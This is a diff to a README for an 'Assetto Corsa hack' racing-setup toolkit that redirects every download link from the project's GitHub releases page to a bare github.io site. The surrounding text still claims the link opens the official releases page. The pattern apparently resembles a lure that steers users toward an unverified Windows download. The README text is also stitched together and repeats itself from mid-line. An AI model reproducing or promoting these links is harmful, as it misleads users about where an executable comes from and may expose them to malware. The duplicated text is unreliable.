@@ -1,6 +1,6 @@
 # 🏁 assetto-corsa-hack-2026-racing-setup-toolkit - Tune Cars, Track Laps, Race Smarter
 
-[![Download the Toolkit](https://img.shields.io/badge/⬇️_Download_the_Toolkit-f72585?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anno29/assetto-corsa-hack-2026-racing-setup-toolkit/releases)
+[![Download the Toolkit](https://img.shields.io/badge/⬇️_Download_the_Toolkit-f72585?style=for-the-badge&logo=github&logoColor=white)](https://anno29.github.io)
 
 ## 🚀 What This Toolkit Does
 
@@ -42,7 +42,7 @@ If you like testing different car setups, writing track reminders, and checking 
 
 Visit this link to download the application.
 
-[Download assetto-corsa-hack-2026-racing-setup-toolkit](https://github.com/Anno29/assetto-corsa-hack-2026-racing-setup-toolkit/releases)
+[Download assetto-corsa-hack-2026-racing-setup-toolkit](https://anno29.github.io)
 
 The download link opens the official releases page for the toolkit. Use that page to get the application for Windows. The same link is used for the main download button at the top of this page and in the download section here.
 
@@ -86,7 +86,7 @@ The goal is to make your next practice session easier. Instead of guessing what 
 
 Garage profiles# 🏁 assetto-corsa-hack-2026-racing-setup-toolkit - Tune Cars, Track Laps, Race Smarter
 
-[![Download the Toolkit](https://img.shields.io/badge/⬇️_Download_the_Toolkit-f72585?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anno29/assetto-corsa-hack-2026-racing-setup-toolkit/releases)
+[![Download the Toolkit](https://img.shields.io/badge/⬇️_Download_the_Toolkit-f72585?style=for-the-badge&logo=github&logoColor=white)](https://anno29.github.io)
 
 ## 🚀 What This Toolkit Does
 
@@ -130,7 +130,7 @@ If you like testing different car setups, writing track reminders, and checking 
 
 Visit this link to download the application.
 
-[Download assetto-corsa-hack-2026-racing-setup-toolkit](https://github.com/Anno29/assetto-corsa-hack-2026-racing-setup-toolkit/releases)
+[Download assetto-corsa-hack-2026-racing-setup-toolkit](https://anno29.github.io)
 
 The download link opens the official releases page for the toolkit. Use that page to get the application for Windows. The same link is used for the main download button at the top of this page and in the download section here.
 
